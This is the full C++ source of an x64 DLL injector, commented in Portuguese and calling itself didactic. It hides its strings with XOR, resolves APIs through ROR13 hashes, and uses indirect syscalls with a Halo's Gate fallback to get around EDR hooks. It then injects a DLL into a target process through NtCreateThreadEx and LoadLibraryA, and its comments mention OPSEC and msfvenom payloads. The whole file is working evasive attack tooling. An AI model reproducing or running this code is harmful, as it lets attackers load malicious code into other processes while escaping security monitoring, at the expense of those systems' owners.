// ============================================================================
// low.cpp — Injector de DLL didático (x64)
//
// Técnicas: Indirect Syscalls, ROR13 (hash de APIs), XOR (strings)
// Alvo de compilação: MSVC x64
//   cl /nologo /O2 /MT /EHs-c- /W4 low.cpp /link /OUT:low.exe
//
// Uso: low.exe <pid> <caminho\absoluta\para\dll>
// ============================================================================

#include <windows.h>
#include <stdint.h>
#include <intrin.h>

#ifndef _WIN64
#error "Este injector usa syscalls x64 (r10/r11). Compile para x64."
#endif

// ============================================================================
// SEÇÃO 1 — XOR: strings ofuscadas em tempo de compilação
//
// O construtor é constexpr: o compilador calcula os bytes cifrados no momento
// da compilação e só os bytes XOR aparecem no binário (.rdata). O texto
// original nunca existe como string literal na imagem do PE.
// ============================================================================
template <size_t N>
struct XorString {
    char enc[N];
    char key;

    constexpr XorString(const char (&s)[N], char k) : enc{}, key(k) {
        for (size_t i = 0; i < N; i++)
            enc[i] = s[i] ^ k;
    }

    // Decodifica para um buffer do chamador (N inclui o '\0' final)
    void decrypt(char* out) const {
        for (size_t i = 0; i < N; i++)
            out[i] = enc[i] ^ key;
    }
};

// Strings de saída cifradas (chave 0x5A). Emulado em .rdata apenas como bytes.
static constexpr XorString<37> ENC_USO(
    "[-] Uso: low.exe <pid> <caminho\\dll>", 0x5A);
static constexpr XorString<39> ENC_GADGET(
    "[-] Falha: gadget syscall;ret em ntdll", 0x5A);
static constexpr XorString<39> ENC_MOD(
    "[-] Falha: resolucao de modulo via PEB", 0x5A);
static constexpr XorString<38> ENC_API(
    "[-] Falha: resolucao de API via ROR13", 0x5A);
static constexpr XorString<38> ENC_STUB(
    "[-] Falha: criacao do stub de syscall", 0x5A);
static constexpr XorString<34> ENC_OPEN(
    "[-] Falha: NtOpenProcess (acesso)", 0x5A);
static constexpr XorString<35> ENC_ALLOC(
    "[-] Falha: NtAllocateVirtualMemory", 0x5A);
static constexpr XorString<32> ENC_WRITE(
    "[-] Falha: NtWriteVirtualMemory", 0x5A);
static constexpr XorString<28> ENC_THREAD(
    "[-] Falha: NtCreateThreadEx", 0x5A);
static constexpr XorString<28> ENC_PATH(
    "[-] Falha: GetFullPathNameA", 0x5A);
static constexpr XorString<51> ENC_LOAD(
    "[-] Falha: LoadLibraryA no alvo nao carregou a DLL", 0x5A);
static constexpr XorString<35> ENC_OK(
    "[+] Injecao realizada com sucesso!", 0x5A);

// Construtor auxiliar: evita contar N à mão nas strings novas.
template <size_t N>
constexpr XorString<N> make_xor(const char (&s)[N], char k) {
    return XorString<N>(s, k);
}

static constexpr auto ENC_WOW64 = make_xor(
    "[-] Alvo WOW64 (x86): este injetor e a DLL precisam ser x64", 0x5A);
static constexpr auto ENC_QUERY = make_xor(
    "[-] Falha: NtQueryInformationProcess", 0x5A);
static constexpr auto ENC_READVM = make_xor(
    "[-] Falha: NtReadVirtualMemory", 0x5A);

// Declaração antecipada: a implementação (resolved) está na Seção 6.
template <size_t N>
static void print_enc_resolved(const XorString<N>& xs);

// ============================================================================
// SEÇÃO 2 — ROR13: função de hash para resolução de módulos e APIs
//
// hash = ROR(hash, 13) + caractere, percorrendo a string sem o '\0'.
// Nomes de módulos são wchar (PEB) com fold para maiúsculas;
// nomes de exports são char (tabela de exportação), case-sensitive.
// ============================================================================
static inline DWORD ror13(DWORD v) {
    return (v >> 13) | (v << 19);
}

// Hash de string ASCII (exports)
static DWORD hash_a(const char* s) {
    DWORD h = 0;
    while (*s) {
        h = ror13(h);
        h += (BYTE)*s++;
    }
    return h;
}

// Hash de string UTF-16 com fold ASCII (nomes de módulos na PEB)
static DWORD hash_w(const wchar_t* s, USHORT bytes_len) {
    DWORD h = 0;
    USHORT nchars = bytes_len / sizeof(wchar_t);
    for (USHORT i = 0; i < nchars; i++) {
        wchar_t c = s[i];
        if (c >= L'a' && c <= L'z')
            c -= 0x20;
        h = ror13(h);
        h += (BYTE)c;
    }
    return h;
}

// Hashes pré-computados (gerados com o mesmo algoritmo acima)
// Módulos (wide, maiúsculas):
#define HASH_NTDLL     0xad74dbf2  // "ntdll.dll"
#define HASH_KERNEL32  0x6e2bca17  // "kernel32.dll"
// Exports ntdll:
#define HASH_NT_OPENPROC       0xf0ca9ca0  // NtOpenProcess
#define HASH_NT_ALLOCVM        0xd33bcabd  // NtAllocateVirtualMemory
#define HASH_NT_WRITVM         0xc5108cc2  // NtWriteVirtualMemory
#define HASH_NT_CREATE_THREAD  0x4d1deb74  // NtCreateThreadEx
#define HASH_NT_WAIT           0xae06c1b2  // NtWaitForSingleObject
#define HASH_NT_CLOSE          0xdcd44c5f  // NtClose
#define HASH_NT_FREEVM         0xdb63b5ab  // NtFreeVirtualMemory
#define HASH_NT_QUERYINFO      0xb10fd839  // NtQueryInformationProcess
#define HASH_NT_READVM         0x3aefa5aa  // NtReadVirtualMemory
// Exports kernel32:
#define HASH_LOADLIBRARYA      0xec0e4e8e  // LoadLibraryA
#define HASH_VIRTUALALLOC      0x91afca54  // VirtualAlloc
#define HASH_VIRTUALPROTECT    0x7946c61b  // VirtualProtect
#define HASH_VIRTUALFREE       0x030633ac  // VirtualFree
#define HASH_GETSTDHANDLE      0x7487d823  // GetStdHandle
#define HASH_WRITEFILE         0xe80a791f  // WriteFile
#define HASH_GETFULLPATHNAMEA  0x31ec005a  // GetFullPathNameA
#define HASH_GETEXITCODETHREAD 0x1b3f95f9  // GetExitCodeThread

// ============================================================================
// SEÇÃO 3 — PEB: estruturas mínimas para caminhar a lista de módulos
// (nada de import table para ntdll/kernel32 — resolvemos tudo manualmente)
// ============================================================================
typedef struct _UNICODE_STR {
    USHORT Length;
    USHORT MaximumLength;
    wchar_t* Buffer;
} UNICODE_STR, *PUNICODE_STR;

typedef struct _PEB_LDR_DATA {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];              // 0x00 InLoadOrderLinks
    LIST_ENTRY InMemoryOrderLinks;   // 0x10
    PVOID Reserved2[2];              // 0x20
    PVOID DllBase;                   // 0x30
    PVOID EntryPoint;                // 0x38
    ULONG SizeOfImage;               // 0x40 (+4 de padding)
    UNICODE_STR FullDllName;         // 0x48
    UNICODE_STR BaseDllName;         // 0x58
} LDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PEB_LDR_DATA* Ldr;
} PEB;

// Lê o PEB: GS:[0x60] no x64
static PEB* get_peb(void) {
#ifdef _WIN64
    return (PEB*)__readgsqword(0x60);
#else
    return (PEB*)__readfsdword(0x30);
#endif
}

// Percorre InMemoryOrderModuleList e retorna o DllBase do módulo cujo
// nome (BaseDllName, wide) bate com o hash fornecido.
static uintptr_t get_module_by_hash(DWORD target_hash) {
    PEB* peb = get_peb();
    if (!peb || !peb->Ldr)
        return 0;

    LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
    for (LIST_ENTRY* e = head->Flink; e != head; e = e->Flink) {
        LDR_DATA_TABLE_ENTRY* entry =
            CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (!entry->BaseDllName.Buffer)
            continue;
        if (hash_w(entry->BaseDllName.Buffer, entry->BaseDllName.Length)
            == target_hash)
            return (uintptr_t)entry->DllBase;
    }
    return 0;
}

// Percorre a tabela de exportações do módulo e retorna o endereço do export
// cujo nome (ASCII) bate com o hash fornecido.
static uintptr_t get_proc_by_hash(uintptr_t module_base, DWORD target_hash) {
    if (!module_base)
        return 0;

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)module_base;
    IMAGE_NT_HEADERS* nt =
        (IMAGE_NT_HEADERS*)(module_base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* exp_dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp_dir->VirtualAddress)
        return 0;

    IMAGE_EXPORT_DIRECTORY* exp =
        (IMAGE_EXPORT_DIRECTORY*)(module_base + exp_dir->VirtualAddress);
    DWORD* names  = (DWORD*)(module_base + exp->AddressOfNames);
    WORD*  ords   = (WORD*)(module_base + exp->AddressOfNameOrdinals);
    DWORD* funcs  = (DWORD*)(module_base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)(module_base + names[i]);
        if (hash_a(name) == target_hash)
            return module_base + funcs[ords[i]];
    }
    return 0;
}

// ============================================================================
// SEÇÃO 4 — Indirect Syscalls
//
// Encadeamento:
//   1. Extrai o SSN (System Service Number) do stub legítimo da ntdll
//      (bytes "4C 8B D1 B8 xx xx xx xx" = mov r10,rcx; mov eax,SSN).
//   2. Localiza no pé da ntdll um gadget "0F 05 C3" (syscall; ret).
//   3. Gera um stub em memória RWX própria:
//        mov r10, rcx          ; convenção de syscalls x64
//        mov eax, <SSN>
//        mov r11, <gadget>     ; endereço do syscall;ret dentro da ntdll
//        jmp r11               ; a instrução syscall executa-se com RIP
//                              ; dentro da ntdll → evita hooks usermode
//                              ; apontando para fora da ntdll
// ============================================================================
static BYTE* g_syscall_gadget = NULL; // syscall; ret dentro da ntdll

// Extrai o SSN do stub original da ntdll (offset 4 após 4C 8B D1 B8).
// Fallback (Halo's Gate simplificado): varre vizinhos a intervalos de 0x20
// caso o stub tenha sido sobrescrito (hook), e ajusta o SSN pela distância.
static DWORD extract_ssn(BYTE* fn) {
    if (!fn)
        return 0;

    // 1) Prologo intacto.
    if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8)
        return *(DWORD*)(fn + 4);

    // 2) Hook de 5 bytes (jmp rel32): segue o desvio e tenta ler o alvo.
    if (fn[0] == 0xE9) {
        LONG rel = *(LONG*)(fn + 1);
        BYTE* target = fn + 5 + rel;
        if (target[0] == 0x4C && target[1] == 0x8B &&
            target[2] == 0xD1 && target[3] == 0xB8)
            return *(DWORD*)(target + 4);
    }

    // 3) Prologo deslocado dentro do MESMO stub (máx. ~1 stub de 0x20).
    //    Não varrer 64 bytes: isso pode cair no stub seguinte e ler o SSN errado.
    for (LONG off = 1; off < 24; off++) {
        BYTE* p = fn + off;
        if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8)
            return *(DWORD*)(p + 4);
    }

    // 4) Fallback Halo's Gate simplificado: stubs vizinhos, espaçamento 0x20.
    for (LONG i = 1; i < 50; i++) {
        BYTE* fwd = fn + i * 0x20;
        if (fwd[0] == 0x4C && fwd[1] == 0x8B && fwd[2] == 0xD1 && fwd[3] == 0xB8) {
            DWORD ssn = *(DWORD*)(fwd + 4);
            return (ssn > (DWORD)i) ? ssn - (DWORD)i : 0;
        }
        BYTE* bwd = fn - i * 0x20;
        if (bwd[0] == 0x4C && bwd[1] == 0x8B && bwd[2] == 0xD1 && bwd[3] == 0xB8)
            return *(DWORD*)(bwd + 4) + (DWORD)i;
    }
    return 0;
}

// Procura o bytes sequence 0F 05 C3 (syscall; ret) em toda a região de
// código da ntdll. Usado como destino do jmp do stub (indirect).
static BYTE* find_syscall_gadget(uintptr_t base, size_t size) {
    // Varre apenas seções executáveis. O primeiro "0F 05 C3" da imagem pode
    // estar em .rdata/.pdata e não ser executável.
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);

    for (WORD s = 0; s < nt->FileHeader.NumberOfSections; s++) {
        if (!(sec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE))
            continue;

        size_t start = sec[s].VirtualAddress;
        size_t len = sec[s].Misc.VirtualSize;
        if (!len)
            len = sec[s].SizeOfRawData;
        if (start >= size)
            continue;
        if (start + len > size)
            len = size - start;

        BYTE* b = (BYTE*)base + start;
        for (size_t i = 0; i + 2 < len; i++) {
            if (b[i] == 0x0F && b[i + 1] == 0x05 && b[i + 2] == 0xC3)
                return b + i;
        }
    }
    return NULL;
}

// Ponteiros do kernel32 necessários já na criação dos stubs (declarados aqui
// para uso por build_indirect_stub; preenchidos na Seção 7).
static decltype(&VirtualAlloc)   pVirtualAlloc;
static decltype(&VirtualProtect) pVirtualProtect;
static decltype(&VirtualFree)    pVirtualFree;

// Aloca memória RW na nossa própria imagem via VirtualAlloc (resolvido por
// hash, sem IAT), grava o stub e promove para RX. O ponteiro retornado é
// chamado como se fosse a função Nt* correspondente.
static void* build_indirect_stub(DWORD ssn) {
    // Stub: mov r10,rcx | mov eax,ssn | mov r11,gadget | jmp r11
    BYTE stub[21] = {
        0x4C, 0x8B, 0xD1,                         // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,             // mov eax, SSN
        0x49, 0xBB, 0x00, 0x00, 0x00, 0x00,       // mov r11, imm64
        0x00, 0x00, 0x00, 0x00,
        0x41, 0xFF, 0xE3                          // jmp r11
    };
    *(DWORD*)(stub + 4) = ssn;
    *(uint64_t*)(stub + 10) = (uint64_t)g_syscall_gadget;

    void* mem = pVirtualAlloc(NULL, sizeof(stub),
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem)
        return NULL;

    memcpy(mem, stub, sizeof(stub));

    DWORD old_prot = 0;
    if (!pVirtualProtect(mem, sizeof(stub), PAGE_EXECUTE_READ, &old_prot)) {
        pVirtualFree(mem, 0, MEM_RELEASE);
        return NULL;
    }
    return mem;
}

// Resolve um export da ntdll, extrai o SSN e cria o stub. Retorna 0 em
// qualquer etapa. Não aceita SSN 0: as funções usadas aqui têm SSN != 0, e
// um zero indica falha de extração (evita chamar o syscall errado).
static int make_stub(uintptr_t ntdll, DWORD name_hash, void** out) {
    BYTE* fn = (BYTE*)get_proc_by_hash(ntdll, name_hash);
    if (!fn)
        return 0;

    DWORD ssn = extract_ssn(fn);
    if (ssn == 0)
        return 0;

    void* stub = build_indirect_stub(ssn);
    if (!stub)
        return 0;

    *out = stub;
    return 1;
}

// ============================================================================
// SEÇÃO 5 — Tipos das funções Nt* e estruturas auxiliares
// ============================================================================
typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define OBJ_CASE_INSENSITIVE 0x00000040

typedef NTSTATUS (NTAPI* PFN_NtOpenProcess)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
typedef NTSTATUS (NTAPI* PFN_NtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI* PFN_NtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI* PFN_NtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI* PFN_NtWaitForSingleObject)(
    HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI* PFN_NtClose)(HANDLE);
typedef NTSTATUS (NTAPI* PFN_NtFreeVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG);
typedef NTSTATUS (NTAPI* PFN_NtQueryInformationProcess)(
    HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI* PFN_NtReadVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

#define ProcessBasicInformation 0
#define ProcessWow64Information 26

// ============================================================================
// SEÇÃO 6 — Ponteiros globais preenchidos na inicialização
// ============================================================================
static PFN_NtOpenProcess             pNtOpenProcess;
static PFN_NtAllocateVirtualMemory   pNtAllocateVirtualMemory;
static PFN_NtWriteVirtualMemory      pNtWriteVirtualMemory;
static PFN_NtCreateThreadEx          pNtCreateThreadEx;
static PFN_NtWaitForSingleObject     pNtWaitForSingleObject;
static PFN_NtClose                   pNtClose;
static PFN_NtFreeVirtualMemory       pNtFreeVirtualMemory;
static PFN_NtQueryInformationProcess pNtQueryInformationProcess;
static PFN_NtReadVirtualMemory       pNtReadVirtualMemory;

static decltype(&LoadLibraryA)       pLoadLibraryA;
// pVirtualAlloc / pVirtualProtect / pVirtualFree declarados antes da Seção 4
static decltype(&GetStdHandle)       pGetStdHandle;
static decltype(&WriteFile)          pWriteFile;
static decltype(&GetFullPathNameA)   pGetFullPathNameA;
static decltype(&GetExitCodeThread)  pGetExitCodeThread;

// Escreve uma XorString já decodificada na saída padrão usando os ponteiros
// resolvidos por hash (sem depender do IAT para GetStdHandle/WriteFile).
template <size_t N>
static void print_enc_resolved(const XorString<N>& xs) {
    char buf[N];
    xs.decrypt(buf);
    if (!pGetStdHandle || !pWriteFile)
        return;
    HANDLE hOut = pGetStdHandle(STD_OUTPUT_HANDLE);
    if (!hOut || hOut == INVALID_HANDLE_VALUE)
        return;
    DWORD written = 0;
    pWriteFile(hOut, buf, (DWORD)(N - 1), &written, NULL);
    pWriteFile(hOut, "\r\n", 2, &written, NULL);
}

// Anexa o NTSTATUS em hexadecimal à última mensagem de erro. Ajuda a
// distinguir ACCESS_DENIED, PROCESS_IS_TERMINATING, INVALID_PARAMETER etc.
static void print_status(NTSTATUS status) {
    static const char hex[] = "0123456789ABCDEF";
    char buf[24];
    DWORD v = (DWORD)status;

    buf[0] = ' '; buf[1] = '('; buf[2] = '0'; buf[3] = 'x';
    for (int i = 0; i < 8; i++)
        buf[4 + i] = hex[(v >> (28 - 4 * i)) & 0xF];
    buf[12] = ')'; buf[13] = '\r'; buf[14] = '\n';

    if (!pGetStdHandle || !pWriteFile)
        return;
    HANDLE hOut = pGetStdHandle(STD_OUTPUT_HANDLE);
    if (!hOut || hOut == INVALID_HANDLE_VALUE)
        return;
    DWORD written = 0;
    pWriteFile(hOut, buf, 15, &written, NULL);
}

// ============================================================================
// SEÇÃO 7 — Inicialização: PEB → módulos → exports → SSN → gadget → stubs
// ============================================================================
static int init(void) {
    uintptr_t ntdll = get_module_by_hash(HASH_NTDLL);
    uintptr_t k32   = get_module_by_hash(HASH_KERNEL32);
    if (!ntdll || !k32)
        return 0;

    // Localiza syscall; ret na ntdll (zona .text — leitura via header PE)
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)ntdll;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(ntdll + dos->e_lfanew);
    size_t text_size = nt->OptionalHeader.SizeOfImage;
    g_syscall_gadget = find_syscall_gadget(ntdll, text_size);
    if (!g_syscall_gadget)
        return 0;

    // APIs kernel32 primeiro (resolvidas por hash): precisamos de
    // VirtualAlloc/VirtualProtect/VirtualFree para materializar os stubs.
    pLoadLibraryA     = (decltype(&LoadLibraryA))
                        get_proc_by_hash(k32, HASH_LOADLIBRARYA);
    pVirtualAlloc     = (decltype(&VirtualAlloc))
                        get_proc_by_hash(k32, HASH_VIRTUALALLOC);
    pVirtualProtect   = (decltype(&VirtualProtect))
                        get_proc_by_hash(k32, HASH_VIRTUALPROTECT);
    pVirtualFree      = (decltype(&VirtualFree))
                        get_proc_by_hash(k32, HASH_VIRTUALFREE);
    pGetStdHandle     = (decltype(&GetStdHandle))
                        get_proc_by_hash(k32, HASH_GETSTDHANDLE);
    pWriteFile        = (decltype(&WriteFile))
                        get_proc_by_hash(k32, HASH_WRITEFILE);
    pGetFullPathNameA = (decltype(&GetFullPathNameA))
                        get_proc_by_hash(k32, HASH_GETFULLPATHNAMEA);
    pGetExitCodeThread = (decltype(&GetExitCodeThread))
                        get_proc_by_hash(k32, HASH_GETEXITCODETHREAD);

    if (!pLoadLibraryA || !pVirtualAlloc || !pVirtualProtect
        || !pVirtualFree || !pGetStdHandle || !pWriteFile
        || !pGetFullPathNameA || !pGetExitCodeThread)
        return 0;

    // APIs ntdll (indirect syscall). make_stub valida export + SSN + alocação.
    if (!make_stub(ntdll, HASH_NT_OPENPROC,     (void**)&pNtOpenProcess))     return 0;
    if (!make_stub(ntdll, HASH_NT_ALLOCVM,      (void**)&pNtAllocateVirtualMemory)) return 0;
    if (!make_stub(ntdll, HASH_NT_WRITVM,       (void**)&pNtWriteVirtualMemory))    return 0;
    if (!make_stub(ntdll, HASH_NT_CREATE_THREAD,(void**)&pNtCreateThreadEx))  return 0;
    if (!make_stub(ntdll, HASH_NT_WAIT,         (void**)&pNtWaitForSingleObject)) return 0;
    if (!make_stub(ntdll, HASH_NT_CLOSE,        (void**)&pNtClose))           return 0;
    if (!make_stub(ntdll, HASH_NT_FREEVM,       (void**)&pNtFreeVirtualMemory)) return 0;
    if (!make_stub(ntdll, HASH_NT_QUERYINFO,    (void**)&pNtQueryInformationProcess)) return 0;
    if (!make_stub(ntdll, HASH_NT_READVM,       (void**)&pNtReadVirtualMemory)) return 0;

    return 1;
}

// Retorna 1 se o alvo for WOW64 (x86). Este injetor é x64 e o LoadLibraryA
// local não é um endereço válido no espaço de endereçamento de um processo x86.
static int target_is_wow64(HANDLE hProcess) {
    ULONG_PTR wow64 = 0;
    ULONG ret = 0;
    NTSTATUS st = pNtQueryInformationProcess(
        hProcess, ProcessWow64Information, &wow64, sizeof(wow64), &ret);
    return NT_SUCCESS(st) && wow64 != 0;
}

// Verifica se a DLL já aparece em InMemoryOrderModuleList do processo alvo.
// Necessário para payloads cujo DllMain chama ExitThread: nesse caso a thread
// remota termina com código 0, mas a DLL FOI carregada. O exit code sozinho
// produziria um falso negativo.
static int remote_module_loaded(HANDLE hProcess, const char* dll_path) {
    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG ret = 0;
    NTSTATUS st = pNtQueryInformationProcess(
        hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ret);
    if (!NT_SUCCESS(st) || !pbi.PebBaseAddress)
        return 0;

    PEB remote_peb = {};
    SIZE_T n = 0;
    st = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &remote_peb,
                              sizeof(remote_peb), &n);
    if (!NT_SUCCESS(st) || n != sizeof(remote_peb) || !remote_peb.Ldr)
        return 0;

    PEB_LDR_DATA ldr = {};
    st = pNtReadVirtualMemory(hProcess, remote_peb.Ldr, &ldr, sizeof(ldr), &n);
    if (!NT_SUCCESS(st) || n != sizeof(ldr))
        return 0;

    const char* base_name = dll_path;
    for (const char* p = dll_path; *p; p++) {
        if (*p == '\\' || *p == '/')
            base_name = p + 1;
    }
    size_t base_len = 0;
    while (base_name[base_len])
        base_len++;

    ULONG_PTR remote_head = (ULONG_PTR)remote_peb.Ldr
                          + FIELD_OFFSET(PEB_LDR_DATA, InMemoryOrderModuleList);
    ULONG_PTR cur = (ULONG_PTR)ldr.InMemoryOrderModuleList.Flink;

    // Limite defensivo: a lista não deve ter centenas de módulos.
    for (int i = 0; i < 512 && cur && cur != remote_head; i++) {
        ULONG_PTR entry_addr = cur
            - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        LDR_DATA_TABLE_ENTRY entry = {};
        st = pNtReadVirtualMemory(hProcess, (PVOID)entry_addr, &entry,
                                  sizeof(entry), &n);
        if (!NT_SUCCESS(st) || n != sizeof(entry))
            return 0;

        USHORT bytes = entry.BaseDllName.Length;
        if (entry.BaseDllName.Buffer && bytes >= sizeof(wchar_t)) {
            wchar_t name[260] = {};
            if (bytes > sizeof(name) - sizeof(wchar_t))
                bytes = (USHORT)(sizeof(name) - sizeof(wchar_t));

            st = pNtReadVirtualMemory(hProcess, entry.BaseDllName.Buffer,
                                      name, bytes, &n);
            if (NT_SUCCESS(st) && n == bytes) {
                size_t chars = bytes / sizeof(wchar_t);
                if (chars == base_len) {
                    int match = 1;
                    for (size_t j = 0; j < chars; j++) {
                        wchar_t c = name[j];
                        char d = base_name[j];
                        if (c >= L'a' && c <= L'z') c -= 0x20;
                        if (d >= 'a' && d <= 'z') d -= 0x20;
                        if ((wchar_t)(BYTE)d != c) {
                            match = 0;
                            break;
                        }
                    }
                    if (match)
                        return 1;
                }
            }
        }

        cur = (ULONG_PTR)entry.InMemoryOrderLinks.Flink;
    }
    return 0;
}

// ============================================================================
// SEÇÃO 8 — Corpo da injeção
// ============================================================================
int main(int argc, char** argv) {
    // 1) Inicializa a cadeia de resolução (PEB -> ROR13 → SSN → gadget).
    if (!init())
        return 1;

    // Bug do original corrigido: verificava argc != 2 mas usava argv[2].
    if (argc != 3) {
        print_enc_resolved(ENC_USO);
        return 1;
    }

    DWORD pid = (DWORD)strtoul(argv[1], NULL, 10);
    if (!pid) {
        print_enc_resolved(ENC_USO);
        return 1;
    }

    // Converte para caminho absoluto: LoadLibraryA rodará no contexto do
    // processo alvo, que pode ter outra pasta de trabalho corrente.
    char dll_path[MAX_PATH] = { 0 };
    if (!pGetFullPathNameA(argv[2], MAX_PATH, dll_path, NULL)) {
        print_enc_resolved(ENC_PATH);
        return 1;
    }
    SIZE_T dll_len = 0;
    while (dll_path[dll_len]) dll_len++;
    dll_len++; // inclui '\0'

    // ---- NtOpenProcess (indirect syscall) ----------------------------------
    // Permissões mínimas necessárias (OPSEC): nada de PROCESS_ALL_ACCESS.
    ACCESS_MASK access = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION
                       | PROCESS_VM_OPERATION | PROCESS_VM_WRITE
                       | PROCESS_VM_READ;

    CLIENT_ID cid = { (HANDLE)(uintptr_t)pid, NULL };
    OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, NULL, OBJ_CASE_INSENSITIVE,
                             NULL, NULL };

    HANDLE hProcess = NULL;
    NTSTATUS st = pNtOpenProcess(&hProcess, access, &oa, &cid);
    if (!NT_SUCCESS(st) || !hProcess) {
        print_enc_resolved(ENC_OPEN);
        print_status(st);
        return 1;
    }

    // Um processo WOW64 é x86; o endereço de LoadLibraryA deste injetor x64
    // não existe no espaço de endereçamento dele. Falha cedo e sem ambiguidade.
    if (target_is_wow64(hProcess)) {
        print_enc_resolved(ENC_WOW64);
        pNtClose(hProcess);
        return 1;
    }

    // ---- NtAllocateVirtualMemory no alvo (indirect syscall) ----------------
    SIZE_T region_size = dll_len;
    PVOID remote_buf = NULL;
    st = pNtAllocateVirtualMemory(hProcess, &remote_buf, 0, &region_size,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st) || !remote_buf) {
        print_enc_resolved(ENC_ALLOC);
        print_status(st);
        pNtClose(hProcess);
        return 1;
    }

    // ---- NtWriteVirtualMemory: escreve o caminho da DLL (indirect) ---------
    SIZE_T written = 0;
    st = pNtWriteVirtualMemory(hProcess, remote_buf, dll_path, dll_len,
                               &written);
    if (!NT_SUCCESS(st) || written != dll_len) {
        print_enc_resolved(ENC_WRITE);
        print_status(st);
        SIZE_T free_sz = 0;
        pNtFreeVirtualMemory(hProcess, &remote_buf, &free_sz, MEM_RELEASE);
        pNtClose(hProcess);
        return 1;
    }

    // ---- NtCreateThreadEx: thread inicia em LoadLibraryA (indirect) --------
    // ASLR é por-boot no Windows: o endereço local de LoadLibraryA em
    // kernel32 é válido no processo alvo (mesma partição de seção).
    HANDLE hThread = NULL;
    st = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                           (PVOID)pLoadLibraryA, remote_buf,
                           0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(st) || !hThread) {
        print_enc_resolved(ENC_THREAD);
        print_status(st);
        SIZE_T free_sz = 0;
        pNtFreeVirtualMemory(hProcess, &remote_buf, &free_sz, MEM_RELEASE);
        pNtClose(hProcess);
        return 1;
    }

    // Espera a LoadLibraryA terminar dentro do alvo antes de limpar.
    pNtWaitForSingleObject(hThread, FALSE, NULL);

    // O valor de retorno da thread é o HMODULE devolvido por LoadLibraryA.
    // Se for 0, pode ser falha real OU DllMain que chamou ExitThread (payloads
    // do msfvenom fazem isso): a thread morre com código 0, mas a DLL fica
    // carregada. Por isso confirmamos pela lista de módulos do alvo.
    DWORD dll_result = 0;
    pGetExitCodeThread(hThread, &dll_result);

    int loaded = (dll_result != 0);
    if (!loaded)
        loaded = remote_module_loaded(hProcess, dll_path);

    // ---- Limpeza -----------------------------------------------------------
    SIZE_T free_sz = 0;
    pNtFreeVirtualMemory(hProcess, &remote_buf, &free_sz, MEM_RELEASE);
    pNtClose(hThread);
    pNtClose(hProcess);

    if (!loaded) {
        print_enc_resolved(ENC_LOAD);
        return 1;
    }

    print_enc_resolved(ENC_OK);
    return 0;
}
